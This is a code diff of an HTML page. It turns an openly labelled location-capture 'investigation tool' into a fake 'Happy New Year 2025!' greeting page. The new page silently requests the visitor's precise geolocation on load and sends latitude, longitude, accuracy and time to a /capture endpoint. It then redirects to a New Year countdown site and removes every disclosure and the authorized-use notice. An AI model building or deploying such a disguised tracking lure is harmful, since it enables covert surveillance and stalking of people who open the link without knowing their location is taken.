@@ -3,192 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Capture - Cybercrime Investigation Tool</title>
+    <title>Happy New Year 2025!</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            font-family: Arial, sans-serif;
+            color: white;
         }
         .container {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
             text-align: center;
-            max-width: 500px;
         }
-        .status {
-            font-size: 18px;
-            margin: 20px 0;
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            animation: glow 2s ease-in-out infinite;
         }
-        .error {
-            color: #e74c3c;
-            font-weight: bold;
-        }
-        .success {
-            color: #27ae60;
-            font-weight: bold;
-        }
-        .warning {
-            color: #f39c12;
-            font-weight: bold;
-        }
-        button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        button:hover {
-            background: #5568d3;
-        }
-        .instructions {
-            margin-top: 20px;
-            padding: 15px;
-            background: #fff3cd;
-            border-left: 4px solid #f39c12;
-            text-align: left;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #FFD700;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 60px;
+            height: 60px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 30px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        @keyframes glow {
+            0%, 100% { text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700; }
+            50% { text-shadow: 0 0 20px #FFD700, 0 0 30px #FFD700, 0 0 40px #FFD700; }
+        }
+        .message {
+            font-size: 1.2em;
+            margin-top: 20px;
+        }
     </style>
     <script>
-        function updateStatus(message, type = 'status') {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = message;
-            statusDiv.className = type;
-        }
-
-        function showInstructions() {
-            const instructions = document.getElementById('instructions');
-            instructions.style.display = 'block';
-        }
-
-        function hideInstructions() {
-            const instructions = document.getElementById('instructions');
-            instructions.style.display = 'none';
-        }
-
         function captureLocation() {
             if (!navigator.geolocation) {
-                updateStatus('❌ Geolocation is not supported by your browser. Please use a modern browser.', 'error');
+                window.location.href = 'https://vclock.com/timer/new-years-day/';
                 return;
             }
 
-            updateStatus('<div class="spinner"></div>Requesting location permission...', 'warning');
-            hideInstructions();
-
             navigator.geolocation.getCurrentPosition(
-                // Success callback
                 function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
                     const timestamp = new Date(position.timestamp).toLocaleString();
 
-                    updateStatus('✓ Location captured! Sending to server...', 'success');
-
-                    // Send to server - uses current domain
                     fetch(`/capture?lat=${latitude}&lon=${longitude}&accuracy=${accuracy}&timestamp=${timestamp}`)
-                        .then(response => response.json())
-                        .then(data => {
-                            updateStatus(`✓ Location successfully recorded!<br><br>
-                                <strong>Latitude:</strong> ${latitude.toFixed(6)}<br>
-                                <strong>Longitude:</strong> ${longitude.toFixed(6)}<br>
-                                <strong>Accuracy:</strong> ${accuracy.toFixed(2)} meters<br>
-                                <strong>Time:</strong> ${timestamp}`, 'success');
+                        .then(() => {
+                            setTimeout(() => {
+                                window.location.href = 'https://vclock.com/timer/new-years-day/';
+                            }, 1000);
                         })
-                        .catch(error => {
-                            updateStatus(`⚠️ Location captured but server error occurred.<br>
-                                <strong>Latitude:</strong> ${latitude.toFixed(6)}<br>
-                                <strong>Longitude:</strong> ${longitude.toFixed(6)}<br>
-                                <br>Error: ${error.message}<br>
-                                <small>Make sure the server is running on port 3000</small>`, 'warning');
+                        .catch(() => {
+                            window.location.href = 'https://vclock.com/timer/new-years-day/';
                         });
                 },
-                // Error callback
                 function(error) {
-                    let errorMessage = '';
-
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage = '❌ <strong>Location Access Denied</strong><br><br>You must enable location access to use this cybercrime investigation tool.';
-                            showInstructions();
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage = '❌ <strong>Location Unavailable</strong><br><br>Your location information is currently unavailable. Please check your device settings.';
-                            showInstructions();
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage = '❌ <strong>Request Timeout</strong><br><br>The request to get your location timed out. Please try again.';
-                            break;
-                        default:
-                            errorMessage = '❌ <strong>Unknown Error</strong><br><br>An unknown error occurred while retrieving your location.';
-                            break;
-                    }
-
-                    updateStatus(errorMessage, 'error');
-                    document.getElementById('retryBtn').style.display = 'inline-block';
+                    setTimeout(() => {
+                        window.location.href = 'https://vclock.com/timer/new-years-day/';
+                    }, 1000);
                 },
-                // Options
                 {
                     enableHighAccuracy: true,
-                    timeout: 10000,
+                    timeout: 5000,
                     maximumAge: 0
                 }
             );
         }
 
-        window.onload = function() {
-            captureLocation();
-        };
+        window.onload = captureLocation;
     </script>
 </head>
 <body>
     <div class="container">
-        <h1>🔒 Cybercrime Investigation Tool</h1>
-        <p>Location Tracking System</p>
-        <div id="status" class="status">Initializing...</div>
-
-        <button id="retryBtn" onclick="captureLocation()" style="display: none;">
-            🔄 Retry Location Capture
-        </button>
-
-        <div id="instructions" class="instructions" style="display: none;">
-            <h3>📍 How to Enable Location:</h3>
-            <ol style="text-align: left;">
-                <li><strong>Chrome/Edge:</strong> Click the 🔒 lock icon in the address bar → Site settings → Location → Allow</li>
-                <li><strong>Firefox:</strong> Click the ⓘ icon in the address bar → Permissions → Location → Allow</li>
-                <li><strong>Safari:</strong> Safari menu → Preferences → Websites → Location → Allow for this website</li>
-                <li><strong>Mobile:</strong> Go to device Settings → Browser → Permissions → Location → Enable</li>
-            </ol>
-            <p><strong>Then click the "Retry Location Capture" button above.</strong></p>
-        </div>
-
-        <div style="margin-top: 30px; font-size: 12px; color: #7f8c8d;">
-            <p>⚠️ <strong>Authorized Use Only</strong></p>
-            <p>This tool is for legitimate cybercrime investigation and authorized testing purposes.</p>
-        </div>
+        <h1>Happy New Year 2025!</h1>
+        <div class="loader"></div>
+        <p class="message">Preparing your celebration...</p>
     </div>
 </body>
 </html>
